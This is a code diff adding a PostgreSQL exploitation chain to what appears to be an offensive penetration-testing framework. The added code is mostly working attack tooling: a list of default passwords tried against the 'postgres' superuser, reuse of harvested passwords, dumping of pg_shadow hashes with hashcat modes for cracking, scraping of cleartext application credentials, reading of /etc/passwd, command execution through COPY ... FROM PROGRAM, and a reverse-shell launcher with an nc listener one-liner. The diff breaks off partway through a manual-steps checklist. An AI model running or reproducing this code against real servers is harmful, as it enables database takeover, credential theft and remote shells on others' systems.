@@ -2480,6 +2480,69 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"MySQL: {mv.group(1).strip()}"[:140]}
         return None
 
+    # 2bh6) psql-shell: a reverse shell was fired through COPY … FROM PROGRAM
+    if sid == "psql-shell":
+        if "shell → " in output:
+            mm = re.search(r"shell → (.+)$", output, re.M)
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"PostgreSQL foothold — {mm.group(1).strip()}"[:140]}
+        return None
+
+    # 2bh5) psql-rce: COPY … FROM PROGRAM → confirmed command execution
+    if sid == "psql-rce":
+        if re.search(r"^✗ RCE ", output, re.M):
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": "PostgreSQL RCE: COPY … FROM PROGRAM command exec"[:140]}
+        return None
+
+    # 2bh4) psql-loot: app creds > pg_shadow hashes / file-read > db inventory
+    if sid == "psql-loot":
+        appc = re.findall(r"^✗ CRED (.+)$", output, re.M)
+        hashes = re.findall(r"^✗ HASH ", output, re.M)
+        fread = re.search(r"^✗ FILE-READ ", output, re.M)
+        dbs = re.findall(r"^· DB ", output, re.M)
+        if appc:
+            shown = "; ".join(c.strip() for c in appc[:2]) + (f" +{len(appc) - 2}" if len(appc) > 2 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"PostgreSQL app creds: {shown}"[:140]}
+        if hashes or fread:
+            bits = []
+            if hashes:
+                bits.append(f"{len(hashes)} pg_shadow hash(es)")
+            if fread:
+                bits.append("pg_read_file /etc/passwd")
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"PostgreSQL loot: {', '.join(bits)}"[:140]}
+        if dbs:
+            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
+                    "summary": f"PostgreSQL: {len(dbs)} non-system database(s) readable"[:140]}
+        return None
+
+    # 2bh3) psql-creds: default/reused login → DB access (superuser flagged)
+    if sid == "psql-creds":
+        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        risk = "CRITICAL" if "(superuser)" in output else "HIGH"
+        return {"state": "VULNERABLE", "cve": cve, "risk": risk,
+                "summary": f"PostgreSQL creds: {shown}"[:140]}
+
+    # 2bh2) psql-banner: trust auth (weakness) → else auth method / version disclosure (info)
+    if sid == "psql-banner":
+        if re.search(r"^✗ TRUST ", output, re.M):
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": "PostgreSQL trust auth — 'postgres' needs no password"[:140]}
+        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
+        if mv:
+            return {"state": "INFO", "cve": None, "risk": "LOW",
+                    "summary": f"PostgreSQL: {mv.group(1).strip()}"[:140]}
+        ma = re.search(r"^\[\*\] Auth method:\s*(.+)$", output, re.M)
+        if ma:
+            return {"state": "INFO", "cve": None, "risk": "LOW",
+                    "summary": f"PostgreSQL: auth {ma.group(1).strip()}"[:140]}
+        return None
+
     # 2bg) telnet-sniff: cleartext telnet creds captured off the wire
     if sid == "telnet-sniff":
         hits = re.findall(r"^✗ SNIFF (.+)$", output, re.M)
@@ -3527,11 +3590,11 @@ _EXPLOIT_STEPS = {
         ("Manual steps & further research", "mssql-next"),
     ],
     "psql": [
-        "Try postgres with blank / default, then known creds",
-        "COPY … FROM/TO PROGRAM → OS command execution (9.3+) → reverse shell",
-        "Read/write server files (pg_read_file / lo_import/lo_export / COPY)",
-        "Enumerate databases & roles; dump app creds; check superuser",
-        "Manual steps & further research",
+        ("Banner: SSL probe + startup handshake → version + auth method → searchsploit", "psql-banner"),
+        ("postgres blank/default + reused creds (psql CLI); flags superuser", "psql-creds"),
+        ("Loot: DBs/roles, pg_shadow hashes, app creds, pg_read_file (read-only)", "psql-loot"),
+        ("RCE: COPY … FROM PROGRAM command exec (superuser, 9.3+, exec-verified)", "psql-rce"),
+        ("Manual steps & further research", "psql-next"),
     ],
     "oracle": [
         "Enumerate the SID (oracle-sid-brute / odat sidguesser)",
@@ -13258,6 +13321,624 @@ def _tool_mysql_next(ip: str, port: int, proto: str) -> str:
     return "\n".join(L)
 
 
+# ══ PostgreSQL (5432) ══ no unauthenticated banner: the server only declares its server_version
+# after a successful login. What IS reachable pre-auth is the wire handshake — an SSLRequest tells
+# us whether TLS is offered, and a StartupMessage makes the server declare its required auth method
+# (trust / cleartext / md5 / SCRAM) or return a structured pg_hba error. All pure stdlib; creds /
+# loot / RCE go through the psql CLI (netexec has no postgres protocol).
+_PG_PROTO_V3 = 196608            # protocol 3.0
+_PG_SSL_MAGIC = 80877103         # SSLRequest sentinel
+_PG_AUTH = {0: "trust (no password)", 2: "KerberosV5", 3: "cleartext password",
+            5: "MD5 password", 6: "SCM credential", 7: "GSSAPI", 9: "SSPI",
+            10: "SASL / SCRAM-SHA-256"}
+
+
+def _pg_ssl_probe(ip: str, port: int, timeout: float = 5.0) -> "bool | None":
+    """Send an SSLRequest → True when the server offers TLS ('S'), False ('N'), None on error."""
+    import socket
+    import struct
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        s.connect((ip, port))
+        s.sendall(struct.pack(">ii", 8, _PG_SSL_MAGIC))
+        r = s.recv(1)
+    except OSError:
+        return None
+    finally:
+        try:
+            s.close()
+        except Exception:                                    # noqa: BLE001
+            pass
+    return True if r == b"S" else (False if r == b"N" else None)
+
+
+def _pg_parse_error(payload: bytes) -> dict:
+    """Parse an ErrorResponse body → {field-code: text} (S=severity, C=SQLSTATE, M=message …)."""
+    fields = {}
+    for chunk in payload.split(b"\x00"):
+        if chunk:
+            fields[chr(chunk[0])] = chunk[1:].decode("latin-1", "replace")
+    return fields
+
+
+def _pg_read_params(sock, budget: float = 2.0) -> dict:
+    """After AuthenticationOk, read ParameterStatus ('S') messages → {key: value}; stop at
+    ReadyForQuery ('Z') / ErrorResponse / EOF / budget."""
+    import struct
+    import time
+    end = time.time() + budget
+    params = {}
+    while time.time() < end:
+        tag = _recv_exact(sock, 1)
+        if len(tag) < 1:
+            break
+        raw = _recv_exact(sock, 4)
+        if len(raw) < 4:
+            break
+        length = struct.unpack(">i", raw)[0]
+        payload = _recv_exact(sock, max(0, length - 4))
+        if tag == b"S":
+            bits = payload.split(b"\x00")
+            if len(bits) >= 2:
+                params[bits[0].decode("latin-1", "replace")] = bits[1].decode("latin-1", "replace")
+        elif tag in (b"Z", b"E"):
+            break
+    return params
+
+
+def _pg_startup(ip: str, port: int, user: str = "postgres", database: str = "postgres",
+                timeout: float = 6.0) -> dict:
+    """Send a StartupMessage and read the server's first reply → the required auth method (and, when
+    the server trusts us, its server_version from the ParameterStatus stream). Returns
+    {auth, code, version, params, error, trust}. Raises when the host doesn't speak PostgreSQL."""
+    import socket
+    import struct
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(timeout)
+    try:
+        try:
+            s.connect((ip, port))
+        except OSError as exc:
+            raise RuntimeError(f"no PostgreSQL on {ip}:{port} ({exc})")
+        params = (f"user\x00{user}\x00database\x00{database}\x00"
+                  "application_name\x00psql\x00\x00").encode()
+        body = struct.pack(">i", _PG_PROTO_V3) + params
+        s.sendall(struct.pack(">i", len(body) + 4) + body)
+        tag = _recv_exact(s, 1)
+        if len(tag) < 1:
+            raise RuntimeError("no reply (not PostgreSQL / TLS-only?)")
+        raw = _recv_exact(s, 4)
+        if len(raw) < 4:
+            raise RuntimeError("truncated reply header")
+        length = struct.unpack(">i", raw)[0]
+        payload = _recv_exact(s, max(0, length - 4))
+        out = {"auth": None, "code": None, "version": None, "params": {},
+               "error": None, "trust": False}
+        if tag == b"R":                                      # AuthenticationRequest
+            atype = struct.unpack(">i", payload[:4])[0] if len(payload) >= 4 else -1
+            out["code"] = atype
+            out["auth"] = _PG_AUTH.get(atype, f"unknown ({atype})")
+            if atype == 0:                                   # AuthenticationOk → trust; slurp params
+                out["trust"] = True
+                out["params"] = _pg_read_params(s)
+                out["version"] = out["params"].get("server_version")
+        elif tag == b"E":                                    # ErrorResponse
+            f = _pg_parse_error(payload)
+            out["error"] = f.get("M") or "error"
+            out["code"] = f.get("C")
+        else:
+            raise RuntimeError(f"unexpected reply tag {tag!r}")
+        return out
+    finally:
+        try:
+            s.close()
+        except Exception:                                    # noqa: BLE001
+            pass
+
+
+def _psql_query(ip: str, port: int, user: str, pw: str, sql: str,
+                db: str = "postgres", timeout: int = 15) -> tuple:
+    """Run SQL via the psql CLI (tab-separated, tuples-only). Returns (rc, output) or (None, '') when
+    psql is absent. rc 0 = success; auth/other errors set rc != 0 and stderr is included."""
+    exe = shutil.which("psql")
+    if not exe:
+        return (None, "")
+    env = dict(os.environ)
+    env["PGPASSWORD"] = pw
+    env["PGCONNECT_TIMEOUT"] = "6"
+    try:
+        p = subprocess.run([exe, "-h", ip, "-p", str(port), "-U", user, "-d", db,
+                            "-w", "-t", "-A", "-F", "\t", "-c", sql],
+                           capture_output=True, text=True, timeout=timeout, env=env)
+        return (p.returncode, (p.stdout or "") + (p.stderr or ""))
+    except (OSError, subprocess.SubprocessError):
+        return (None, "")
+
+
+def _psql_auth(ip: str, port: int, user: str, pw: str) -> bool:
+    """True when (user, pw) authenticates to PostgreSQL (psql CLI)."""
+    rc, out = _psql_query(ip, port, user, pw, "SELECT 1")
+    low = out.lower()
+    return rc == 0 and "authentication failed" not in low and "fatal" not in low
+
+
+def _psql_superuser(ip: str, port: int, user: str, pw: str) -> bool:
+    """True when the login is a superuser (SHOW is_superuser → 'on')."""
+    rc, out = _psql_query(ip, port, user, pw, "SHOW is_superuser")
+    return rc == 0 and out.strip().lower().startswith("on")
+
+
+def _gather_psql_creds(ip: str) -> list:
+    """(user, pass) PostgreSQL logins psql-creds proved for this host ('postgres on <ip>')."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! (\S+?):(\S*) @ postgres on {re.escape(ip)}\b", output or ""):
+            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
+    return out
+
+
+def _tool_psql_banner(ip: str, port: int, proto: str) -> str:
+    """PostgreSQL step 1 tool: probe the wire handshake (pure stdlib) — an SSLRequest reports whether
+    TLS is offered, and a StartupMessage makes the server declare its required auth method (trust /
+    cleartext / md5 / SCRAM) or return a structured pg_hba error. When the server trusts us — or a
+    cred is already stored — its exact server_version is recorded as the service and fed to
+    searchsploit. No brute, no login attempt beyond the trust check. A host that doesn't speak
+    PostgreSQL raises. Authorised targets only."""
+    ssl_ok = _pg_ssl_probe(ip, port)
+    info = _pg_startup(ip, port)
+    version = info["version"]
+    lines = []
+    if ssl_ok is True:
+        lines.append("· SSL/TLS offered (SSLRequest → 'S')")
+    elif ssl_ok is False:
+        lines.append("· no SSL — cleartext auth travels in the clear")
+    if info["auth"]:
+        tag = "  ← no password needed!" if info["trust"] else ""
+        lines.append(f"[*] Auth method: {info['auth']}{tag}")
+    if info["trust"]:
+        lines.append("✗ TRUST auth — the 'postgres' login needs no password (misconfiguration)")
+    if info["error"]:
+        code = info["code"] or "?"
+        lines.append(f"· server up, StartupMessage refused: [{code}] {info['error']}")
+        if code == "28000" or "pg_hba" in (info["error"] or "").lower():
+            lines.append("· our source host isn't in pg_hba.conf — try from an allowed host / DB / user")
+
+    if not version:                                          # already-proven cred → grab the version
+        for u, p in _gather_psql_creds(ip):
+            rc, vout = _psql_query(ip, port, u, p, "SHOW server_version")
+            if rc == 0 and vout.strip():
+                version = vout.strip().split()[0]
+                break
+    if version:
+        vnum = re.match(r"[\d.]+", version)
+        vnum = vnum.group(0) if vnum else version
+        save_services(ip, [{"port": port, "proto": proto, "name": "postgresql",
+                            "product": "PostgreSQL", "version": vnum}])
+        lines.append(f"[*] Service: PostgreSQL {version}")
+        ss = shutil.which("searchsploit")
+        if ss:
+            proc = subprocess.run([ss, "-j", "-s", "-t", "PostgreSQL", vnum],
+                                  capture_output=True, text=True, timeout=30)
+            try:
+                rows = json.loads(proc.stdout or "{}").get("RESULTS_EXPLOIT", [])
+            except ValueError:
+                rows = []
+            seen = set()
+            for r in rows[:20]:
+                edb = str(r.get("EDB-ID", "?"))
+                if edb in seen:
+                    continue
+                seen.add(edb)
+                lines.append(f"[searchsploit] {(r.get('Title') or '').strip()}  (EDB-{edb})")
+                if len(seen) >= 8:
+                    break
+        else:
+            lines.append("· searchsploit not installed — check Exploit-DB for the version manually")
+    else:
+        lines.append("· version only reveals after login — run psql-creds (r2), then re-run for searchsploit")
+    return f"PostgreSQL banner — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+# ── PostgreSQL step 2: postgres blank/default + reused creds; flag superuser ──────
+_PGCREDS_DEADLINE = 120
+_PGCREDS_MAX = 60
+_PG_DEFAULTS = [
+    ("postgres", "postgres"), ("postgres", ""), ("postgres", "password"),
+    ("postgres", "admin"), ("postgres", "root"), ("postgres", "postgres123"),
+    ("postgres", "P@ssw0rd"), ("postgres", "changeme"), ("postgres", "123456"),
+    ("admin", "admin"), ("pgsql", "pgsql"), ("test", "test"),
+]
+
+
+def _tool_psql_creds(ip: str, port: int, proto: str) -> str:
+    """PostgreSQL step 2 tool: try the 'postgres' superuser with no/blank password plus a curated set
+    of default creds and any harvested password (reuse across services) via the psql CLI — targeted,
+    NOT a wordlist brute. Each valid login is flagged superuser-or-not and saved to the store
+    ('postgres on <host>'). No psql client → raises. Authorised targets only."""
+    import time
+    if not shutil.which("psql"):
+        raise RuntimeError("need the psql client (postgresql-client) to test PostgreSQL creds")
+
+    reused = [(u, s) for _d, u, s in _gather_all_smb_creds()
+              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
+    candidates, seen = [], set()
+    for u, p in _PG_DEFAULTS + [("postgres", s) for _u, s in reused] + reused:
+        key = (u.lower(), p)
+        if key not in seen:
+            seen.add(key)
+            candidates.append((u, p, (u, p) not in _PG_DEFAULTS))
+    candidates = candidates[:_PGCREDS_MAX]
+
+    deadline = time.time() + _PGCREDS_DEADLINE
+    valid = []
+    for user, pw, is_reused in candidates:
+        if time.time() > deadline:
+            break
+        if _psql_auth(ip, port, user, pw):
+            valid.append((user, pw, is_reused, _psql_superuser(ip, port, user, pw)))
+            break                                            # one working login is enough
+
+    if valid:                                                # persist to the canonical creds store
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for user, pw, _r, _su in valid:
+            line = f"! {user}:{pw or '<blank>'} @ postgres on {ip} [{ip}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {len(candidates)} cred(s) tried (defaults + reuse) · {len(valid)} valid"]
+    for user, pw, is_reused, su in valid:
+        sut = "  (superuser)" if su else ""
+        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}{sut}" + ("  (reused)" if is_reused else ""))
+    if valid:
+        if any(su for *_r, su in valid):
+            lines.append("· superuser → loot pg_shadow (r3) and COPY … FROM PROGRAM RCE (r4)")
+        else:
+            lines.append("· non-superuser — loot readable DBs/tables (r3); RCE needs superuser / pg_execute_server_program")
+    else:
+        lines.append("· no default/reused login worked — SCRAM/md5 with an unknown password; try SQLi-leaked creds")
+    return f"PostgreSQL credentials — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+# ── PostgreSQL step 3: loot — DBs/roles, pg_shadow hashes, app creds, pg_read_file ──
+_PGLOOT_DEADLINE = 120
+_PG_SYSDB = ("template0", "template1")
+
+
+def _tool_psql_loot(ip: str, port: int, proto: str) -> str:
+    """PostgreSQL step 3 tool: with a proven cred, enumerate databases and roles, dump the
+    pg_shadow / pg_authid password hashes (superuser → md5/SCRAM, crackable), harvest cleartext app
+    credentials from tables with password-like columns across the reachable databases, and
+    pg_read_file('/etc/passwd') when superuser. Read-only queries via psql. No stored cred / no
+    client → raises. Authorised targets only."""
+    import time
+    creds = _gather_psql_creds(ip)
+    if not creds:
+        raise RuntimeError("no PostgreSQL creds — run psql-creds (r2) first")
+    if not shutil.which("psql"):
+        raise RuntimeError("psql client required for loot (query execution)")
+
+    user = pw = None
+    for u, p in creds:
+        rc, _o = _psql_query(ip, port, u, p, "SELECT 1")
+        if rc == 0:
+            user, pw = u, p
+            break
+    if user is None:
+        raise RuntimeError("stored PostgreSQL creds no longer authenticate — re-run psql-creds (r2)")
+
+    deadline = time.time() + _PGLOOT_DEADLINE
+
+    def q(sql, db="postgres", t=15):
+        return _psql_query(ip, port, user, pw, sql, db, t)
+
+    rc, ctx = q("SELECT current_user||'\t'||version()||'\t'||current_setting('is_superuser')")
+    who = ver = ""
+    superuser = False
+    if rc == 0 and ctx.strip():
+        parts = ctx.strip().split("\t")
+        who = parts[0] if parts else user
+        ver = (parts[1].split(" on ")[0] if len(parts) > 1 else "")
+        superuser = len(parts) > 2 and parts[2].strip().lower() == "on"
+
+    rc, dbsout = q("SELECT datname FROM pg_database WHERE datistemplate=false AND datallowconn")
+    userdbs = [d for d in (dbsout.split("\n") if rc == 0 else []) if d and d not in _PG_SYSDB]
+
+    rc, rolesout = q("SELECT rolname||'\t'||rolsuper FROM pg_roles ORDER BY rolsuper DESC, rolname")
+    supers = []
+    if rc == 0:
+        for ln in rolesout.split("\n"):
+            if "\t" in ln:
+                rn, rs = ln.split("\t", 1)
+                if rs.strip() in ("t", "true", "on"):
+                    supers.append(rn.strip())
+
+    hashes = []
+    if superuser:
+        rc, hs = q("SELECT usename||'\t'||passwd FROM pg_shadow WHERE passwd IS NOT NULL")
+        if rc == 0:
+            for ln in hs.split("\n"):
+                if "\t" in ln:
+                    un, h = ln.split("\t", 1)
+                    if h.strip() and h.strip() != "NULL":
+                        hashes.append((un.strip(), h.strip()))
+
+    appcreds = []
+    for db in (userdbs or ["postgres"]):
+        if time.time() > deadline or len(appcreds) >= 20:
+            break
+        rc, cols = q("SELECT table_schema||'\t'||table_name||'\t'||column_name "
+                     "FROM information_schema.columns WHERE column_name ~* 'pass|pwd|secret|token' "
+                     "AND table_schema NOT IN ('pg_catalog','information_schema') LIMIT 40", db=db)
+        tables = {}
+        if rc == 0:
+            for ln in cols.split("\n"):
+                p3 = ln.split("\t")
+                if len(p3) == 3 and all(p3):
+                    tables.setdefault((p3[0], p3[1]), []).append(p3[2])
+        for (schema, table), passcols in list(tables.items())[:6]:
+            if time.time() > deadline:
+                break
+            rc, idc = q(f'SELECT column_name FROM information_schema.columns '
+                        f"WHERE table_schema='{schema}' AND table_name='{table}' "
+                        f"AND column_name ~* 'user|email|login|name' LIMIT 1", db=db)
+            idcol = idc.strip().split("\n")[0] if rc == 0 and idc.strip() else None
+            sel = f'"{idcol}","{passcols[0]}"' if idcol else f'"{passcols[0]}"'
+            rc, rows = q(f'SELECT {sel} FROM "{schema}"."{table}" LIMIT 5', db=db)
+            if rc == 0:
+                for ln in rows.split("\n"):
+                    if ln.strip():
+                        appcreds.append((f"{db}.{schema}.{table}", ln.strip().replace("\t", ":")))
+
+    fileread = None
+    if superuser:
+        rc, pf = q("SELECT pg_read_file('/etc/passwd', 0, 4096)")
+        if rc == 0 and "root:" in (pf or ""):
+            fileread = pf.strip().split("\n")[0]
+
+    lines = [f"[*] as {who or user} · {ver or 'PostgreSQL'} · superuser: {'yes' if superuser else 'no'}"]
+    for un, h in hashes[:20]:
+        algo = "SCRAM (hashcat -m 28600)" if h.startswith("SCRAM-") else "md5 (hashcat -m 12)"
+        lines.append(f"✗ HASH {un} {h[:64]}  (pg_shadow — crack: {algo})")
+    for src, val in appcreds[:20]:
+        lines.append(f"✗ CRED {val[:80]}  ({src})")
+    if fileread:
+        lines.append(f"✗ FILE-READ /etc/passwd — {fileread}")
+    for d in userdbs[:20]:
+        lines.append(f"· DB {d}")
+    if supers:
+        lines.append(f"· superuser roles: {', '.join(supers[:8])}"
+                     + (f" +{len(supers) - 8}" if len(supers) > 8 else ""))
+    if superuser:
+        lines.append("· superuser → COPY … FROM PROGRAM RCE (r4); pg_read_file / lo_export any file")
+    elif not hashes and not appcreds:
+        lines.append("· non-superuser & nothing looted — check other DBs manually; RCE needs superuser")
+    return f"PostgreSQL loot — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+# ── PostgreSQL step 4: RCE — COPY … FROM PROGRAM command execution (superuser, 9.3+) ──
+_PGRCE_DEADLINE = 60
+
+
+def _psql_program_exec(ip: str, port: int, user: str, pw: str, cmd: str, timeout: int = 20) -> tuple:
+    """Run an OS command on the server via COPY … FROM PROGRAM (needs superuser / 9.3+). Returns
+    (rc, captured_stdout). The command's stdout is captured into a throwaway table and read back,
+    then the table is dropped."""
+    esc = cmd.replace("'", "''")
+    sql = ("DROP TABLE IF EXISTS pshunter_rce; CREATE TABLE pshunter_rce(o text); "
+           f"COPY pshunter_rce FROM PROGRAM '{esc}'; "
+           "SELECT string_agg(o, chr(10)) FROM pshunter_rce; DROP TABLE pshunter_rce;")
+    rc, out = _psql_query(ip, port, user, pw, sql, timeout=timeout)
+    return rc, out
+
+
+def _tool_psql_rce(ip: str, port: int, proto: str) -> str:
+    """PostgreSQL step 4 tool: with a superuser cred, confirm OS command execution via
+    COPY … FROM PROGRAM — the command's stdout is captured into a throwaway table and read back
+    (real, exec-verified RCE with a computed marker). Runs `id` / `uname -a` for context and drops
+    the temp table afterwards. Reports the confirmed RCE channel (spawn a reverse shell via
+    spawn-shell r1). Needs a stored superuser cred + psql. Authorised targets only."""
+    import os as _os
+    creds = _gather_psql_creds(ip)
+    if not creds:
+        raise RuntimeError("no PostgreSQL creds — run psql-creds (r2) first")
+    if not shutil.which("psql"):
+        raise RuntimeError("psql client required for RCE (COPY FROM PROGRAM)")
+    user = pw = None
+    for u, p in creds:
+        if _psql_superuser(ip, port, u, p):
+            user, pw = u, p
+            break
+    lines = []
+    if user is None:
+        lines.append("[*] no superuser cred among the stored logins")
+        lines.append("· COPY … FROM PROGRAM needs superuser (or the pg_execute_server_program role)")
+        lines.append("· escalate first: crack a pg_shadow hash (psql-loot r3) or ALTER ROLE via a superuser")
+        return f"PostgreSQL RCE — {ip}:{port}\n\n" + "\n".join(lines)
+
+    mark = f"PSH{_os.urandom(2).hex()}"
+    rc, out = _psql_program_exec(ip, port, user, pw, f"echo {mark}$((6*7)); id; uname -a")
+    confirmed = rc == 0 and f"{mark}42" in (out or "")
+    lines.append(f"[*] as {user} (superuser) · COPY FROM PROGRAM")
+    if confirmed:
+        idline = next((ln for ln in out.split("\n") if ln.startswith("uid=")), "")
+        unameln = next((ln for ln in out.split("\n") if "Linux" in ln or "GNU" in ln), "")
+        lines.append("✗ RCE COPY … FROM PROGRAM — command execution confirmed (marker echoed back)")
+        if idline:
+            lines.append(f"  {idline.strip()}")
+        if unameln:
+            lines.append(f"  {unameln.strip()}")
+        lines.append("· spawn a reverse shell: Privilege Escalation phase → spawn-shell (r1)")
+    else:
+        lines.append("· superuser but COPY FROM PROGRAM did not return the marker — restricted / patched?")
+        lines.append(f"  {DIM}raw: {(out or '').strip()[:160]}{RESET}")
+    return f"PostgreSQL RCE — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_psql_shell(ip: str, port: int, proto: str) -> str:
+    """PostgreSQL foothold (INTERACTIVE): fire a reverse shell through COPY … FROM PROGRAM — smart
+    auto-upgrading listener on a free local port, then trigger the SQL (backgrounded, with retries).
+    Headless prints the psql one-liner. Requires a confirmed superuser cred. Authorised targets only."""
+    import time
+    import threading
+    rout = next((o for s, o in fetch_scripts(ip, port, proto) if s == "psql-rce"), "")
+    if "✗ RCE " not in rout:
+        print(f"\n{YELLOW}no confirmed PostgreSQL RCE{RESET} — run {BOLD}psql-rce (r4){RESET} first.")
+        return "psql-shell: no confirmed RCE (run psql-rce r4)"
+    creds = _gather_psql_creds(ip)
+    user = pw = None
+    for u, p in creds:
+        if _psql_superuser(ip, port, u, p):
+            user, pw = u, p
+            break
+    if user is None:
+        print(f"{RED}✗ no superuser cred available{RESET} — re-run psql-creds (r2).")
+        return "psql-shell: no superuser cred"
+
+    lhost = _foothold_lhost(ip)
+    if not lhost:
+        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
+        return "psql-shell: no LHOST"
+    lport = _free_local_port(4444)
+    if lport != 4444:
+        print(f"{YELLOW}port 4444 in use{RESET}{DIM} — using {BOLD}{lport}{RESET}{DIM} for the listener{RESET}")
+    _rlabel, _n, rtpl, rpty = _REVSHELLS[3]                   # bash /dev/tcp — universal; listener upgrades it
+    revsh = rtpl.replace("{ip}", lhost).replace("{port}", str(lport))
+    upgrade = b"" if rpty else _FOOTHOLD_UPGRADE.encode()
+    src = (_SMART_LISTENER_SRC.replace("__LPORT__", str(lport)).replace("__UPGRADE__", repr(upgrade)))
+    fd, spath = tempfile.mkstemp(prefix="pshunter_listener_", suffix=".py")
+    with os.fdopen(fd, "w") as fh:
+        fh.write(src)
+    used = _open_listener_terminal(spath)
+
+    def _fire():
+        try:
+            _psql_program_exec(ip, port, user, pw, revsh, timeout=25)
+        except Exception:                                    # noqa: BLE001
+            pass
+
+    if not used:
+        _safe_unlink(spath)
+        print(f"{YELLOW}headless{RESET} — start {BOLD}nc -lvnp {lport}{RESET}, then fire:\n  "
+              f"{BOLD}psql -h {ip} -p {port} -U {user} -c \"COPY (SELECT 1) TO PROGRAM "
+              f"'<url-encoded reverse shell>'\"{RESET}")
+        return f"psql-shell: headless — COPY PROGRAM as {user}"
+    print(f"{GREEN}▶ smart listener opened{RESET} {DIM}({used}) on {lhost}:{lport}{RESET}")
+    time.sleep(1.5)
+    for _ in range(3):
+        threading.Thread(target=_fire, daemon=True).start()  # COPY PROGRAM blocks on the shell → don't wait
+        time.sleep(1.0)
+    print(f"  {DIM}→ check the new terminal for your {GREEN}shell{RESET}{DIM}; "
+          f"if nothing landed, re-run psql-rce then retry{RESET}")
+    return f"psql-shell: COPY-PROGRAM shell → {lhost}:{lport} (as {user})"
+
+
+# ── PostgreSQL step 5: manual steps & further research (reference only, context-aware) ─
+def _tool_psql_next(ip: str, port: int, proto: str) -> str:
+    """PostgreSQL step-5 tool: NOT a scan — a read-only checklist of where to go on PostgreSQL, with
+    this host's own findings substituted in (confirmed RCE or creds to spawn, pg_shadow hashes to
+    crack, app creds to reuse, superuser file read/write, phase CVEs, and unconfirmed ⚠ hits). Pure
+    DB synthesis."""
+    scripts = fetch_scripts(ip, port, proto)
+    by_sid = {}
+    for sid, out in scripts:
+        by_sid.setdefault(sid, out or "")
+    banner, loot, rce = by_sid.get("psql-banner", ""), by_sid.get("psql-loot", ""), by_sid.get("psql-rce", "")
+
+    mv = re.search(r"^\[\*\] Service:\s*(.+)$", banner, re.M)
+    ver = mv.group(1).strip() if mv else ""
+    creds = _gather_psql_creds(ip)
+    hashes = re.findall(r"^✗ HASH (.+)$", loot, re.M)
+    appcreds = re.findall(r"^✗ CRED (.+)$", loot, re.M)
+    dbs = re.findall(r"^· DB (\S+)", loot, re.M)
+    superuser = "superuser: yes" in loot or "(superuser)" in by_sid.get("psql-creds", "")
+    has_rce = "✗ RCE " in rce
+
+    oports = {(p, pr) for p, pr, _s in fetch_ports(ip)}
+    reuse_svc = [n for (pnum, n) in ((22, "SSH"), (445, "SMB"), (21, "FTP"), (5985, "WinRM"))
+                 if (pnum, "tcp") in oports]
+
+    kev = _load_kev()
+    found = set()
+    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
+        if p == port and pr == proto and cv:
+            found |= {c.strip() for c in cv.split(",") if c.strip()}
+    for _sid, out in scripts:
+        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
+    found = sorted(found, key=_cve_sort_key)
+
+    warns = []
+    for sid, out in scripts:
+        for ln in (out or "").splitlines():
+            if ln.strip().startswith("⚠"):
+                warns.append(f"{DIM}[{sid}]{RESET} {ln.strip()}")
+    warns = warns[:14]
+
+    sub = (f"{DIM}version: {ver or 'unknown'}  ·  creds: {len(creds)}  ·  "
+           f"superuser: {'yes' if superuser else 'no'}  ·  RCE: {'yes' if has_rce else 'no'}")
+    L = [f"PostgreSQL {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}", sub + RESET]
+
+    L.append(f"\n{BOLD}A. Get code exec{RESET}")
+    if has_rce:
+        L.append(f"  {CYAN}ready{RESET} {DIM}(COPY … FROM PROGRAM) → Privilege Escalation phase → spawn-shell (r1){RESET}")
+    elif superuser:
+        L.append(f"  {DIM}superuser → confirm COPY … FROM PROGRAM (psql-rce r4); mysqld/postgres often runs as the postgres user{RESET}")
+    else:
+        L.append(f"  {DIM}need a superuser cred — COPY … FROM PROGRAM / pg_execute_server_program; else no direct RCE{RESET}")
+    L.append(f"  {DIM}alt exec: untrusted PL/perlU or PL/pythonu functions; extension abuse (CREATE EXTENSION){RESET}")
+
+    L.append(f"\n{BOLD}B. Crack & reuse{RESET}")
+    if hashes:
+        L.append(f"  {CYAN}{len(hashes)} pg_shadow hash(es){RESET} {DIM}→ hashcat -m 12 (md5) / -m 28600 (SCRAM); "
+                 f"cracked → reuse as OS/DB creds{RESET}")
+    if appcreds:
+        L.append(f"  {CYAN}app creds:{RESET} {', '.join(a.split(' ')[0] for a in appcreds[:5])}"
+                 + (f" {DIM}+{len(appcreds) - 5}{RESET}" if len(appcreds) > 5 else ""))
+    tgt = ", ".join(reuse_svc) if reuse_svc else "SSH / SMB / web-login"
+    L.append(f"  {DIM}reuse any recovered password on {tgt} (password reuse across the estate){RESET}")
+    if not hashes and not appcreds:
+        L.append(f"  {DIM}nothing looted yet — run psql-loot (r3){RESET}")
+
